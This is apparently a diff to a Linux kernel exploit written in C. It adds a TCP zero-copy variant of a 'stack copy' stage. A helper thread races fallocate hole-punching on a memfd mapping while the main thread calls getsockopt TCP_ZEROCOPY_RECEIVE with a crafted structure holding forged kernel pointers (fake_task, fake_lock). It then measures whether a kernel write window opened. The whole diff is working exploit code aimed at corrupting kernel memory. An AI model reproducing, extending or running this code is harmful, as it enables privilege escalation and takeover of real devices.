@@ -438,6 +438,212 @@ void slide_pselect_stack_copy(void) {
   close(pipefd[1]);
 }
 
+#if defined(TARGET_USES_TCP_ZEROCOPY) && TARGET_USES_TCP_ZEROCOPY
+#define SLIDE_TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
+static atomic_int slide_tcp_punch_go;
+static atomic_int slide_tcp_punch_stop;
+static atomic_int slide_tcp_punch_phase;
+static atomic_int slide_tcp_punch_failed;
+
+struct slide_tcp_punch_state {
+  int fd;
+  size_t page_size;
+};
+
+static void *slide_tcp_punch_thread(void *arg) {
+  disable_rseq_for_thread();
+  struct slide_tcp_punch_state *state = arg;
+  while (!atomic_load(&slide_tcp_punch_go) &&
+         !atomic_load(&slide_tcp_punch_stop)) {
+    sched_yield();
+  }
+  while (!atomic_load(&slide_tcp_punch_stop)) {
+    if (fallocate(state->fd, 0, 0, SLIDE_TCP_PUNCH_SHMEM_LEN) != 0) {
+      atomic_store(&slide_tcp_punch_failed, errno ? errno : EIO);
+      break;
+    }
+    atomic_store(&slide_tcp_punch_phase, 1);
+    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
+                  (off_t)state->page_size,
+                  SLIDE_TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
+      atomic_store(&slide_tcp_punch_failed, errno ? errno : EIO);
+    }
+    atomic_store(&slide_tcp_punch_phase, 0);
+    if (atomic_load(&slide_tcp_punch_failed)) break;
+  }
+  return NULL;
+}
+
+static int slide_tcp_make_pair(int *client_fd, int *server_fd) {
+  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (listener < 0) return -1;
+  int one = 1;
+  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+
+  struct sockaddr_in addr;
+  memset(&addr, 0, sizeof(addr));
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+  addr.sin_port = 0;
+
+  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
+      listen(listener, 1) != 0) {
+    int saved = errno;
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+
+  socklen_t addr_len = sizeof(addr);
+  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
+    int saved = errno;
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+
+  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (*client_fd < 0) {
+    int saved = errno;
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+    int saved = errno;
+    close(*client_fd);
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+
+  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
+  int saved = errno;
+  close(listener);
+  if (*server_fd < 0) {
+    close(*client_fd);
+    errno = saved;
+    return -1;
+  }
+  return 0;
+}
+
+void slide_tcp_stack_copy(void) {
+  if (!page_base || !fake_lock || !fake_w0) {
+    pr_error("slide tcp missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
+             page_base, fake_lock, fake_w0);
+    return;
+  }
+
+  int client_fd = -1, server_fd = -1, punch_fd = -1;
+  char *map = MAP_FAILED;
+  pthread_t puncher;
+  int puncher_started = 0;
+
+  if (slide_tcp_make_pair(&client_fd, &server_fd) != 0) {
+    pr_error("slide tcp pair setup failed errno=%d\n", errno);
+    return;
+  }
+
+  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+  punch_fd = (int)syscall(SYS_memfd_create, "slide-tcp", MFD_CLOEXEC);
+  if (punch_fd < 0 || fallocate(punch_fd, 0, 0, SLIDE_TCP_PUNCH_SHMEM_LEN) != 0) {
+    pr_error("slide tcp memfd failed errno=%d\n", errno);
+    goto out;
+  }
+  map = mmap(NULL, SLIDE_TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
+             MAP_SHARED, punch_fd, 0);
+  if (map == MAP_FAILED) {
+    pr_error("slide tcp mmap failed errno=%d\n", errno);
+    goto out;
+  }
+  for (size_t off = 0; off < SLIDE_TCP_PUNCH_SHMEM_LEN; off += page_size) {
+    map[off] = 0x55;
+  }
+
+  struct slide_tcp_punch_state punch_state = {
+    .fd = punch_fd, .page_size = page_size
+  };
+  atomic_store(&slide_tcp_punch_stop, 0);
+  atomic_store(&slide_tcp_punch_phase, 0);
+  atomic_store(&slide_tcp_punch_failed, 0);
+  atomic_store(&slide_consume_stop, 0);
+  atomic_store(&slide_consume_go, 0);
+  atomic_store(&slide_consume_calls, 0);
+  atomic_store(&slide_consume_sched_ok, 0);
+  atomic_store(&slide_pselect_write_window, 0);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  atomic_store(&slide_pselect_started_ns, 0);
+#endif
+
+  if (pthread_create(&puncher, NULL, slide_tcp_punch_thread, &punch_state) != 0) {
+    pr_error("slide tcp punch thread failed errno=%d\n", errno);
+    goto out;
+  }
+  puncher_started = 1;
+
+  struct timespec timeout = {
+    .tv_sec = 0,
+    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
+  };
+  struct timespec *timeoutp = &timeout;
+
+  size_t tcp_started = gettime_ns();
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  atomic_store(&slide_pselect_started_ns, tcp_started);
+#endif
+
+  atomic_store(&slide_tcp_punch_go, 1);
+  atomic_store(&slide_consume_go, 1);
+
+  char sendbuf[64];
+  memset(sendbuf, 0x33, sizeof(sendbuf));
+
+  unsigned char zc[0x40];
+  memset(zc, 0, sizeof(zc));
+  put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
+  put32(zc, 0x20, sizeof(sendbuf));
+  put64(zc, 0x28, (uint64_t)(uintptr_t)fake_task);
+  put64(zc, 0x30, (uint64_t)(uintptr_t)fake_lock);
+
+  socklen_t len = sizeof(zc);
+  errno = 0;
+  int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc, &len);
+  int saved_errno = errno;
+  size_t tcp_elapsed_usec = (gettime_ns() - tcp_started) / 1000ULL;
+  atomic_store(&slide_consume_go, 0);
+
+  if (atomic_load(&slide_consume_enter_sched) != 0 &&
+      !atomic_load(&slide_consume_stop)) {
+    size_t deadline = gettime_ns() + 200000000ULL;
+    while (!atomic_load(&slide_consume_stop) && gettime_ns() < deadline) {
+      usleep(1000);
+    }
+  }
+
+  pr_info("slide tcp returned ret=%d errno=%d elapsed_usec=%zu "
+          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d\n",
+          ret, saved_errno, tcp_elapsed_usec,
+          atomic_load(&slide_consumer_ready),
+          atomic_load(&slide_consume_seen),
+          atomic_load(&slide_consume_enter_sched),
+          atomic_load(&slide_consume_calls),
+          atomic_load(&slide_consume_sched_ok));
+
+  atomic_store(&slide_pselect_write_window,
+               ret == 0 && atomic_load(&slide_consume_sched_ok) > 0);
+
+out:
+  atomic_store(&slide_tcp_punch_go, 0);
+  atomic_store(&slide_tcp_punch_stop, 1);
+  if (puncher_started) pthread_join(puncher, NULL);
+  if (map != MAP_FAILED) munmap(map, SLIDE_TCP_PUNCH_SHMEM_LEN);
+  if (punch_fd >= 0) close(punch_fd);
+  if (server_fd >= 0) close(server_fd);
+  if (client_fd >= 0) close(client_fd);
+}
+#endif
+
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
 static long slide_read_task_syscall_nr(int tid) {
   char path[64];
@@ -693,7 +899,11 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     __asm__ volatile("yield" ::: "memory");
   }
 
+#if defined(TARGET_USES_TCP_ZEROCOPY) && TARGET_USES_TCP_ZEROCOPY
+  slide_tcp_stack_copy();
+#else
   slide_pselect_stack_copy();
+#endif
   atomic_store(&slide_route_done, 1);
 
   for (;;) {
